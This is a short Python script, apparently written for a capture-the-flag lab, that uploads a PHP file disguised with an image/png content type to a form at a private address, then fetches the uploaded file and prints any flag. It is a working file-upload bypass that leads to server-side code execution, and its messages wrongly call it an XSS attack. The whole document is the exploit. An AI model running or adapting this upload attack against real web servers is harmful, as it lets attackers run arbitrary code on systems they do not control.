import requests

url='http://192.168.56.103:80/form.php'
headers={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183',

}
filepath=r'catflag1.php'
file={
    'file':(filepath,open(filepath,'rb'),'image/png')
}
response=requests.post(
    url=url,
    headers=headers,
    files=file,
)
if response.status_code!=200:
    print('web error')
    exit()
    
#print(response.text)
if 'Success' in response.text:
    print('上传成功')
    new_url='http://192.168.56.103:80/upload/catflag1.php'
    new_response = requests.get(new_url)
    if new_response.status_code!=200:
        print('The requested URL was not found')
        exit()
    
    if 'flag' in new_response.text:
        print(new_response.text)
    else:
        print('XSS attack failed!')
    
else:
    print('XSS attack failed!')
    
